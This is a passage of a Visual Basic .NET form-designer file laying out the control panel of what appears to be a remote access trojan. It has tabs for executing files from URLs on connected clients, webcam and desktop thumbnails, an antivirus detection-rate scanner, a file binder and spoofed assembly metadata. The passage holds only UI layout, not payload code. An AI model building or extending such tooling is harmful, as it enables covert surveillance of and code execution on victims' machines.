        Me.Label10.AutoSize = True
        Me.Label10.Location = New System.Drawing.Point(4, 151)
        Me.Label10.Name = "Label10"
        Me.Label10.Size = New System.Drawing.Size(73, 19)
        Me.Label10.TabIndex = 8
        Me.Label10.Text = "Copyright:"
        '
        'tb_assemblyproduct
        '
        Me.tb_assemblyproduct.Location = New System.Drawing.Point(87, 117)
        Me.tb_assemblyproduct.Name = "tb_assemblyproduct"
        Me.tb_assemblyproduct.Size = New System.Drawing.Size(186, 25)
        Me.tb_assemblyproduct.TabIndex = 7
        '
        'Label9
        '
        Me.Label9.AutoSize = True
        Me.Label9.Location = New System.Drawing.Point(4, 120)
        Me.Label9.Name = "Label9"
        Me.Label9.Size = New System.Drawing.Size(60, 19)
        Me.Label9.TabIndex = 6
        Me.Label9.Text = "Product:"
        '
        'tb_assemblycompany
        '
        Me.tb_assemblycompany.Location = New System.Drawing.Point(87, 86)
        Me.tb_assemblycompany.Name = "tb_assemblycompany"
        Me.tb_assemblycompany.Size = New System.Drawing.Size(186, 25)
        Me.tb_assemblycompany.TabIndex = 5
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(4, 89)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(71, 19)
        Me.Label8.TabIndex = 4
        Me.Label8.Text = "Company:"
        '
        'tb_assemblydescription
        '
        Me.tb_assemblydescription.Location = New System.Drawing.Point(87, 55)
        Me.tb_assemblydescription.Name = "tb_assemblydescription"
        Me.tb_assemblydescription.Size = New System.Drawing.Size(186, 25)
        Me.tb_assemblydescription.TabIndex = 3
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(4, 58)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(81, 19)
        Me.Label7.TabIndex = 2
        Me.Label7.Text = "Description:"
        '
        'tb_assemblytitle
        '
        Me.tb_assemblytitle.Location = New System.Drawing.Point(87, 24)
        Me.tb_assemblytitle.Name = "tb_assemblytitle"
        Me.tb_assemblytitle.Size = New System.Drawing.Size(186, 25)
        Me.tb_assemblytitle.TabIndex = 1
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(4, 27)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(37, 19)
        Me.Label6.TabIndex = 0
        Me.Label6.Text = "Title:"
        '
        'TP_Logs
        '
        Me.TP_Logs.Controls.Add(Me.LV_Logs)
        Me.TP_Logs.Location = New System.Drawing.Point(154, 4)
        Me.TP_Logs.Name = "TP_Logs"
        Me.TP_Logs.Size = New System.Drawing.Size(873, 426)
        Me.TP_Logs.TabIndex = 3
        Me.TP_Logs.Text = "Logs"
        Me.TP_Logs.UseVisualStyleBackColor = True
        '
        'LV_Logs
        '
        Me.LV_Logs.ColorGridLines = System.Drawing.Color.FromArgb(CType(CType(65, Byte), Integer), CType(CType(186, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.LV_Logs.Columns.AddRange(New Object() {Me.LVC_Time, Me.LVC_Log})
        Me.LV_Logs.ContextMenuStrip = Me.CMS_Logs
        Me.LV_Logs.Dock = System.Windows.Forms.DockStyle.Fill
        Me.LV_Logs.HScrollBarDisplayMode = ComponentOwl.BetterListView.BetterListViewScrollBarDisplayMode.Hide
        Me.LV_Logs.Location = New System.Drawing.Point(0, 0)
        Me.LV_Logs.Name = "LV_Logs"
        Me.LV_Logs.Size = New System.Drawing.Size(873, 426)
        Me.LV_Logs.TabIndex = 0
        '
        'TP_OnConnect
        '
        Me.TP_OnConnect.Controls.Add(Me.Label15)
        Me.TP_OnConnect.Controls.Add(Me.ComboBox3)
        Me.TP_OnConnect.Controls.Add(Me.ComboBox2)
        Me.TP_OnConnect.Controls.Add(Me.Label14)
        Me.TP_OnConnect.Controls.Add(Me.ComboBox1)
        Me.TP_OnConnect.Controls.Add(Me.LV_OnConnect)
        Me.TP_OnConnect.Location = New System.Drawing.Point(154, 4)
        Me.TP_OnConnect.Name = "TP_OnConnect"
        Me.TP_OnConnect.Size = New System.Drawing.Size(873, 426)
        Me.TP_OnConnect.TabIndex = 4
        Me.TP_OnConnect.Text = "OnConnect"
        Me.TP_OnConnect.UseVisualStyleBackColor = True
        '
        'Label15
        '
        Me.Label15.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Label15.AutoSize = True
        Me.Label15.Location = New System.Drawing.Point(665, 396)
        Me.Label15.Name = "Label15"
        Me.Label15.Size = New System.Drawing.Size(12, 19)
        Me.Label15.TabIndex = 5
        Me.Label15.Text = "|"
        '
        'ComboBox3
        '
        Me.ComboBox3.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ComboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.ComboBox3.FormattingEnabled = True
        Me.ComboBox3.Location = New System.Drawing.Point(695, 394)
        Me.ComboBox3.Name = "ComboBox3"
        Me.ComboBox3.Size = New System.Drawing.Size(170, 25)
        Me.ComboBox3.TabIndex = 4
        '
        'ComboBox2
        '
        Me.ComboBox2.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.ComboBox2.FormattingEnabled = True
        Me.ComboBox2.Items.AddRange(New Object() {"All", "Location", "ClientID", "Operating System", "Privilegs"})
        Me.ComboBox2.Location = New System.Drawing.Point(514, 394)
        Me.ComboBox2.Name = "ComboBox2"
        Me.ComboBox2.Size = New System.Drawing.Size(145, 25)
        Me.ComboBox2.TabIndex = 3
        '
        'Label14
        '
        Me.Label14.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Label14.AutoSize = True
        Me.Label14.Location = New System.Drawing.Point(375, 396)
        Me.Label14.Name = "Label14"
        Me.Label14.Size = New System.Drawing.Size(129, 19)
        Me.Label14.TabIndex = 2
        Me.Label14.Text = "Perform Action for: "
        '
        'ComboBox1
        '
        Me.ComboBox1.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.ComboBox1.FormattingEnabled = True
        Me.ComboBox1.Items.AddRange(New Object() {"Execute File from URL", "Execute File", "Update Server from URL", "Update Server from File", "InputBox", "MessageBox", "Disconnect", "Uninstall"})
        Me.ComboBox1.Location = New System.Drawing.Point(190, 393)
        Me.ComboBox1.Name = "ComboBox1"
        Me.ComboBox1.Size = New System.Drawing.Size(174, 25)
        Me.ComboBox1.TabIndex = 1
        '
        'LV_OnConnect
        '
        Me.LV_OnConnect.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.LV_OnConnect.Columns.AddRange(New Object() {Me.BetterListViewColumnHeader5, Me.BetterListViewColumnHeader6, Me.BetterListViewColumnHeader7})
        Me.LV_OnConnect.ContextMenuStrip = Me.CMS_OnConnect
        Me.LV_OnConnect.ImageList = Me.IL_OnConnect
        Me.LV_OnConnect.Location = New System.Drawing.Point(6, 6)
        Me.LV_OnConnect.Name = "LV_OnConnect"
        Me.LV_OnConnect.Size = New System.Drawing.Size(859, 381)
        Me.LV_OnConnect.TabIndex = 0
        '
        'TP_Thumbnail
        '
        Me.TP_Thumbnail.Controls.Add(Me.Panel2)
        Me.TP_Thumbnail.Controls.Add(Me.Panel1)
        Me.TP_Thumbnail.Location = New System.Drawing.Point(154, 4)
        Me.TP_Thumbnail.Name = "TP_Thumbnail"
        Me.TP_Thumbnail.Size = New System.Drawing.Size(873, 426)
        Me.TP_Thumbnail.TabIndex = 5
        Me.TP_Thumbnail.Text = "Thumbnails"
        Me.TP_Thumbnail.UseVisualStyleBackColor = True
        '
        'Panel2
        '
        Me.Panel2.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Panel2.Controls.Add(Me.ImageListView1)
        Me.Panel2.Location = New System.Drawing.Point(5, 8)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(860, 374)
        Me.Panel2.TabIndex = 2
        '
        'ImageListView1
        '
        Me.ImageListView1.AllowDuplicateFileNames = True
        Me.ImageListView1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ImageListView1.DefaultImage = CType(resources.GetObject("ImageListView1.DefaultImage"), System.Drawing.Image)
        Me.ImageListView1.ErrorImage = CType(resources.GetObject("ImageListView1.ErrorImage"), System.Drawing.Image)
        Me.ImageListView1.HeaderFont = New System.Drawing.Font("Tahoma", 8.0!)
        Me.ImageListView1.Location = New System.Drawing.Point(0, 0)
        Me.ImageListView1.Name = "ImageListView1"
        Me.ImageListView1.Size = New System.Drawing.Size(120, 101)
        Me.ImageListView1.TabIndex = 3
        Me.ImageListView1.Text = ""
        Me.ImageListView1.ThumbnailSize = New System.Drawing.Size(274, 190)
        '
        'Panel1
        '
        Me.Panel1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Panel1.BackColor = System.Drawing.Color.LightSlateGray
        Me.Panel1.Controls.Add(Me.Button_Thumbnail)
        Me.Panel1.Controls.Add(Me.CB_Thumbnail_Webcam)
        Me.Panel1.Controls.Add(Me.CB_Thumbnail_Desktop)
        Me.Panel1.Location = New System.Drawing.Point(5, 388)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(860, 38)
        Me.Panel1.TabIndex = 1
        '
        'Button_Thumbnail
        '
        Me.Button_Thumbnail.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Button_Thumbnail.Image = CType(resources.GetObject("Button_Thumbnail.Image"), System.Drawing.Image)
        Me.Button_Thumbnail.Location = New System.Drawing.Point(823, 3)
        Me.Button_Thumbnail.Name = "Button_Thumbnail"
        Me.Button_Thumbnail.Size = New System.Drawing.Size(32, 32)
        Me.Button_Thumbnail.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.Button_Thumbnail.TabIndex = 2
        Me.Button_Thumbnail.TabStop = False
        '
        'CB_Thumbnail_Webcam
        '
        Me.CB_Thumbnail_Webcam.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.CB_Thumbnail_Webcam.AutoSize = True
        Me.CB_Thumbnail_Webcam.Location = New System.Drawing.Point(717, 9)
        Me.CB_Thumbnail_Webcam.Name = "CB_Thumbnail_Webcam"
        Me.CB_Thumbnail_Webcam.Size = New System.Drawing.Size(81, 23)
        Me.CB_Thumbnail_Webcam.TabIndex = 1
        Me.CB_Thumbnail_Webcam.Text = "Webcam"
        Me.CB_Thumbnail_Webcam.UseVisualStyleBackColor = True
        '
        'CB_Thumbnail_Desktop
        '
        Me.CB_Thumbnail_Desktop.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.CB_Thumbnail_Desktop.AutoSize = True
        Me.CB_Thumbnail_Desktop.Checked = True
        Me.CB_Thumbnail_Desktop.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CB_Thumbnail_Desktop.Location = New System.Drawing.Point(625, 9)
        Me.CB_Thumbnail_Desktop.Name = "CB_Thumbnail_Desktop"
        Me.CB_Thumbnail_Desktop.Size = New System.Drawing.Size(79, 23)
        Me.CB_Thumbnail_Desktop.TabIndex = 0
        Me.CB_Thumbnail_Desktop.Text = "Desktop"
        Me.CB_Thumbnail_Desktop.UseVisualStyleBackColor = True
        '
        'TC_Other
        '
        Me.TC_Other.Controls.Add(Me.TabControl222)
        Me.TC_Other.Location = New System.Drawing.Point(154, 4)
        Me.TC_Other.Name = "TC_Other"
        Me.TC_Other.Size = New System.Drawing.Size(873, 426)
        Me.TC_Other.TabIndex = 6
        Me.TC_Other.Text = "Other"
        Me.TC_Other.UseVisualStyleBackColor = True
        '
        'TabControl222
        '
        Me.TabControl222.Controls.Add(Me.TabPage3)
        Me.TabControl222.Controls.Add(Me.TabPage4)
        Me.TabControl222.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControl222.Location = New System.Drawing.Point(0, 0)
        Me.TabControl222.Name = "TabControl222"
        Me.TabControl222.SelectedIndex = 0
        Me.TabControl222.Size = New System.Drawing.Size(873, 426)
        Me.TabControl222.TabIndex = 0
        '
        'TabPage3
        '
        Me.TabPage3.Controls.Add(Me.rtb_news)
        Me.TabPage3.Controls.Add(Me.LV_News)
        Me.TabPage3.Location = New System.Drawing.Point(4, 26)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage3.Size = New System.Drawing.Size(865, 396)
        Me.TabPage3.TabIndex = 0
        Me.TabPage3.Text = "News"
        Me.TabPage3.UseVisualStyleBackColor = True
        '
        'rtb_news
        '
        Me.rtb_news.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.rtb_news.Location = New System.Drawing.Point(303, 6)
        Me.rtb_news.Name = "rtb_news"
        Me.rtb_news.Size = New System.Drawing.Size(556, 384)
        Me.rtb_news.TabIndex = 1
        Me.rtb_news.Text = ""
        '
        'LV_News
        '
        Me.LV_News.Anchor = CType(((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left), System.Windows.Forms.AnchorStyles)
        Me.LV_News.Columns.AddRange(New Object() {Me.BetterListViewColumnHeader3, Me.BetterListViewColumnHeader4})
        Me.LV_News.Location = New System.Drawing.Point(6, 6)
        Me.LV_News.Name = "LV_News"
        Me.LV_News.Size = New System.Drawing.Size(290, 384)
        Me.LV_News.TabIndex = 0
        '
        'TabPage4
        '
        Me.TabPage4.Controls.Add(Me.Label_TOS)
        Me.TabPage4.Location = New System.Drawing.Point(4, 26)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage4.Size = New System.Drawing.Size(865, 395)
        Me.TabPage4.TabIndex = 1
        Me.TabPage4.Text = "TOS"
        Me.TabPage4.UseVisualStyleBackColor = True
        '
        'Label_TOS
        '
        Me.Label_TOS.AutoSize = True
        Me.Label_TOS.Location = New System.Drawing.Point(48, 30)
        Me.Label_TOS.Name = "Label_TOS"
        Me.Label_TOS.Size = New System.Drawing.Size(718, 304)
        Me.Label_TOS.TabIndex = 0
        Me.Label_TOS.Text = resources.GetString("Label_TOS.Text")
        '
        'TC_Statistics
        '
        Me.TC_Statistics.Controls.Add(Me.TabControl32222)
        Me.TC_Statistics.Location = New System.Drawing.Point(154, 4)
        Me.TC_Statistics.Name = "TC_Statistics"
        Me.TC_Statistics.Size = New System.Drawing.Size(873, 426)
        Me.TC_Statistics.TabIndex = 7
        Me.TC_Statistics.Text = "Statistics"
        Me.TC_Statistics.UseVisualStyleBackColor = True
        '
        'TabControl32222
        '
        Me.TabControl32222.Controls.Add(Me.TabPage5)
        Me.TabControl32222.Controls.Add(Me.TabPage6)
        Me.TabControl32222.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControl32222.Location = New System.Drawing.Point(0, 0)
        Me.TabControl32222.Name = "TabControl32222"
        Me.TabControl32222.SelectedIndex = 0
        Me.TabControl32222.Size = New System.Drawing.Size(873, 426)
        Me.TabControl32222.TabIndex = 0
        '
        'TabPage5
        '
        Me.TabPage5.Controls.Add(Me.Graph_Sent)
        Me.TabPage5.Controls.Add(Me.Label16)
        Me.TabPage5.Location = New System.Drawing.Point(4, 26)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage5.Size = New System.Drawing.Size(865, 396)
        Me.TabPage5.TabIndex = 0
        Me.TabPage5.UseVisualStyleBackColor = True
        '
        'Graph_Sent
        '
        Me.Graph_Sent.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Graph_Sent.BorderColor = System.Drawing.Color.Black
        Me.Graph_Sent.DataColumnForeColor = System.Drawing.Color.Black
        Me.Graph_Sent.DataSmoothing = False
        Me.Graph_Sent.DataSmoothingLevel = CType(2, Byte)
        Me.Graph_Sent.DrawDataColumn = True
        Me.Graph_Sent.DrawHorizontalLines = True
        Me.Graph_Sent.DrawHoverData = True
        Me.Graph_Sent.DrawHoverLine = False
        Me.Graph_Sent.DrawLineGraph = False
        Me.Graph_Sent.DrawVerticalLines = False
        Me.Graph_Sent.FillColor = System.Drawing.Color.White
        Me.Graph_Sent.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.Graph_Sent.GraphBorderColor = System.Drawing.Color.DodgerBlue
        Me.Graph_Sent.GraphFillColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(144, Byte), Integer), CType(CType(238, Byte), Integer), CType(CType(144, Byte), Integer))
        Me.Graph_Sent.HorizontalLineColor = System.Drawing.Color.FromArgb(CType(CType(238, Byte), Integer), CType(CType(238, Byte), Integer), CType(CType(238, Byte), Integer))
        Me.Graph_Sent.HoverBorderColor = System.Drawing.Color.ForestGreen
        Me.Graph_Sent.HoverFillColor = System.Drawing.Color.White
        Me.Graph_Sent.HoverLabelBorderColor = System.Drawing.Color.DarkGray
        Me.Graph_Sent.HoverLabelFillColor = System.Drawing.Color.White
        Me.Graph_Sent.HoverLabelForeColor = System.Drawing.Color.Gray
        Me.Graph_Sent.HoverLabelShadowColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Graph_Sent.HoverLineColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(34, Byte), Integer), CType(CType(139, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.Graph_Sent.LineGraphColor = System.Drawing.Color.FromArgb(CType(CType(130, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(200, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.Graph_Sent.Location = New System.Drawing.Point(13, 27)
        Me.Graph_Sent.Name = "Graph_Sent"
        Me.Graph_Sent.OverrideMax = False
        Me.Graph_Sent.OverrideMaxValue = 100.0!
        Me.Graph_Sent.OverrideMin = False
        Me.Graph_Sent.OverrideMinValue = 0.0!
        Me.Graph_Sent.SidePadding = True
        Me.Graph_Sent.Size = New System.Drawing.Size(846, 363)
        Me.Graph_Sent.TabIndex = 1
        Me.Graph_Sent.Text = "Graph1"
        Me.Graph_Sent.Values = New Single(-1) {}
        Me.Graph_Sent.VerticalLineColor = System.Drawing.Color.FromArgb(CType(CType(248, Byte), Integer), CType(CType(248, Byte), Integer), CType(CType(248, Byte), Integer))
        '
        'Label16
        '
        Me.Label16.AutoSize = True
        Me.Label16.Location = New System.Drawing.Point(9, 5)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(73, 19)
        Me.Label16.TabIndex = 0
        Me.Label16.Text = "Sent Bytes"
        '
        'TabPage6
        '
        Me.TabPage6.Controls.Add(Me.Graph_Receive)
        Me.TabPage6.Controls.Add(Me.Label17)
        Me.TabPage6.Location = New System.Drawing.Point(4, 26)
        Me.TabPage6.Name = "TabPage6"
        Me.TabPage6.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage6.Size = New System.Drawing.Size(865, 395)
        Me.TabPage6.TabIndex = 1
        Me.TabPage6.UseVisualStyleBackColor = True
        '
        'Graph_Receive
        '
        Me.Graph_Receive.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Graph_Receive.BorderColor = System.Drawing.Color.Black
        Me.Graph_Receive.DataColumnForeColor = System.Drawing.Color.Black
        Me.Graph_Receive.DataSmoothing = False
        Me.Graph_Receive.DataSmoothingLevel = CType(2, Byte)
        Me.Graph_Receive.DrawDataColumn = True
        Me.Graph_Receive.DrawHorizontalLines = True
        Me.Graph_Receive.DrawHoverData = True
        Me.Graph_Receive.DrawHoverLine = False
        Me.Graph_Receive.DrawLineGraph = False
        Me.Graph_Receive.DrawVerticalLines = False
        Me.Graph_Receive.FillColor = System.Drawing.Color.White
        Me.Graph_Receive.Font = New System.Drawing.Font("Verdana", 8.25!)
        Me.Graph_Receive.GraphBorderColor = System.Drawing.Color.ForestGreen
        Me.Graph_Receive.GraphFillColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(144, Byte), Integer), CType(CType(238, Byte), Integer), CType(CType(144, Byte), Integer))
        Me.Graph_Receive.HorizontalLineColor = System.Drawing.Color.FromArgb(CType(CType(238, Byte), Integer), CType(CType(238, Byte), Integer), CType(CType(238, Byte), Integer))
        Me.Graph_Receive.HoverBorderColor = System.Drawing.Color.ForestGreen
        Me.Graph_Receive.HoverFillColor = System.Drawing.Color.White
        Me.Graph_Receive.HoverLabelBorderColor = System.Drawing.Color.DarkGray
        Me.Graph_Receive.HoverLabelFillColor = System.Drawing.Color.White
        Me.Graph_Receive.HoverLabelForeColor = System.Drawing.Color.Gray
        Me.Graph_Receive.HoverLabelShadowColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(0, Byte), Integer))
        Me.Graph_Receive.HoverLineColor = System.Drawing.Color.FromArgb(CType(CType(35, Byte), Integer), CType(CType(34, Byte), Integer), CType(CType(139, Byte), Integer), CType(CType(34, Byte), Integer))
        Me.Graph_Receive.LineGraphColor = System.Drawing.Color.FromArgb(CType(CType(130, Byte), Integer), CType(CType(0, Byte), Integer), CType(CType(200, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.Graph_Receive.Location = New System.Drawing.Point(13, 27)
        Me.Graph_Receive.Name = "Graph_Receive"
        Me.Graph_Receive.OverrideMax = False
        Me.Graph_Receive.OverrideMaxValue = 100.0!
        Me.Graph_Receive.OverrideMin = False
        Me.Graph_Receive.OverrideMinValue = 0.0!
        Me.Graph_Receive.SidePadding = True
        Me.Graph_Receive.Size = New System.Drawing.Size(846, 362)
        Me.Graph_Receive.TabIndex = 3
        Me.Graph_Receive.Text = "Graph2"
        Me.Graph_Receive.Values = New Single(-1) {}
        Me.Graph_Receive.VerticalLineColor = System.Drawing.Color.FromArgb(CType(CType(248, Byte), Integer), CType(CType(248, Byte), Integer), CType(CType(248, Byte), Integer))
        '
        'Label17
        '
        Me.Label17.AutoSize = True
        Me.Label17.Location = New System.Drawing.Point(9, 5)
        Me.Label17.Name = "Label17"
        Me.Label17.Size = New System.Drawing.Size(99, 19)
        Me.Label17.TabIndex = 2
        Me.Label17.Text = "Received Bytes"
        '
        'TabPage9
        '
        Me.TabPage9.Controls.Add(Me.ProgressBar1)
        Me.TabPage9.Controls.Add(Me.btn_scan)
        Me.TabPage9.Controls.Add(Me.Label_Detection)
        Me.TabPage9.Controls.Add(Me.LV_Scanner)
        Me.TabPage9.Location = New System.Drawing.Point(154, 4)
        Me.TabPage9.Name = "TabPage9"
        Me.TabPage9.Size = New System.Drawing.Size(873, 426)
        Me.TabPage9.TabIndex = 8
        Me.TabPage9.Text = "Scanner"
        Me.TabPage9.UseVisualStyleBackColor = True
        '
        'ProgressBar1
        '
        Me.ProgressBar1.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.ProgressBar1.Location = New System.Drawing.Point(158, 391)
        Me.ProgressBar1.MarqueeAnimationSpeed = 0
        Me.ProgressBar1.Name = "ProgressBar1"
        Me.ProgressBar1.Size = New System.Drawing.Size(611, 25)
        Me.ProgressBar1.Style = System.Windows.Forms.ProgressBarStyle.Continuous
        Me.ProgressBar1.TabIndex = 4
        '
        'btn_scan
        '
        Me.btn_scan.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.btn_scan.Location = New System.Drawing.Point(775, 389)
        Me.btn_scan.Name = "btn_scan"
        Me.btn_scan.Size = New System.Drawing.Size(90, 27)
        Me.btn_scan.TabIndex = 3
        Me.btn_scan.Text = "Scan File"
        Me.btn_scan.UseVisualStyleBackColor = True
        '
        'Label_Detection
        '
        Me.Label_Detection.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Label_Detection.AutoSize = True
        Me.Label_Detection.Location = New System.Drawing.Point(17, 394)
        Me.Label_Detection.Name = "Label_Detection"
        Me.Label_Detection.Size = New System.Drawing.Size(135, 19)
        Me.Label_Detection.TabIndex = 1
        Me.Label_Detection.Text = "Detection Rate: 0/39"
        '
        'LV_Scanner
        '
        Me.LV_Scanner.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
            Or System.Windows.Forms.AnchorStyles.Left) _
            Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.LV_Scanner.Columns.AddRange(New Object() {Me.BetterListViewColumnHeader1, Me.BetterListViewColumnHeader2})
        Me.LV_Scanner.Location = New System.Drawing.Point(8, 6)
        Me.LV_Scanner.Name = "LV_Scanner"
        Me.LV_Scanner.Size = New System.Drawing.Size(857, 380)
        Me.LV_Scanner.TabIndex = 0
        '
        'TabPage10
        '
        Me.TabPage10.Controls.Add(Me.GroupBox11)
        Me.TabPage10.Controls.Add(Me.GroupBox10)
        Me.TabPage10.Controls.Add(Me.GroupBox9)
        Me.TabPage10.Controls.Add(Me.GroupBox8)
        Me.TabPage10.Location = New System.Drawing.Point(154, 4)
        Me.TabPage10.Name = "TabPage10"
        Me.TabPage10.Size = New System.Drawing.Size(873, 426)
        Me.TabPage10.TabIndex = 9
        Me.TabPage10.Text = "Misc."
        Me.TabPage10.UseVisualStyleBackColor = True
        '
        'GroupBox11
        '
        Me.GroupBox11.Controls.Add(Me.Label26)
        Me.GroupBox11.Controls.Add(Me.Button10)
        Me.GroupBox11.Controls.Add(Me.Button9)
        Me.GroupBox11.Controls.Add(Me.TextBox8)
        Me.GroupBox11.Controls.Add(Me.Label25)
        Me.GroupBox11.Controls.Add(Me.Button8)
        Me.GroupBox11.Controls.Add(Me.TextBox7)
        Me.GroupBox11.Controls.Add(Me.Label24)
        Me.GroupBox11.Location = New System.Drawing.Point(425, 203)
        Me.GroupBox11.Name = "GroupBox11"
        Me.GroupBox11.Size = New System.Drawing.Size(432, 199)
        Me.GroupBox11.TabIndex = 3
        Me.GroupBox11.TabStop = False
        Me.GroupBox11.Text = "File Binder"
        '
        'Label26
        '
        Me.Label26.AutoSize = True
        Me.Label26.Location = New System.Drawing.Point(291, 175)
        Me.Label26.Name = "Label26"
        Me.Label26.Size = New System.Drawing.Size(139, 19)
        Me.Label26.TabIndex = 21
        Me.Label26.Text = "Files will be Dropped!"
        '
        'Button10
        '
        Me.Button10.Location = New System.Drawing.Point(315, 141)
        Me.Button10.Name = "Button10"
        Me.Button10.Size = New System.Drawing.Size(113, 32)
        Me.Button10.TabIndex = 20
        Me.Button10.Text = "Bind"
        Me.Button10.UseVisualStyleBackColor = True
        '
        'Button9
        '
        Me.Button9.Location = New System.Drawing.Point(394, 108)
        Me.Button9.Name = "Button9"
        Me.Button9.Size = New System.Drawing.Size(34, 27)
        Me.Button9.TabIndex = 19
        Me.Button9.Text = "[...]"
        Me.Button9.UseVisualStyleBackColor = True
        '
        'TextBox8
        '
        Me.TextBox8.Location = New System.Drawing.Point(22, 110)
        Me.TextBox8.Name = "TextBox8"
        Me.TextBox8.Size = New System.Drawing.Size(366, 25)
        Me.TextBox8.TabIndex = 18
        '
        'Label25
        '
        Me.Label25.AutoSize = True
        Me.Label25.Location = New System.Drawing.Point(18, 88)
        Me.Label25.Name = "Label25"
        Me.Label25.Size = New System.Drawing.Size(86, 19)
        Me.Label25.TabIndex = 17
        Me.Label25.Text = "Select a File :"
        '
        'Button8
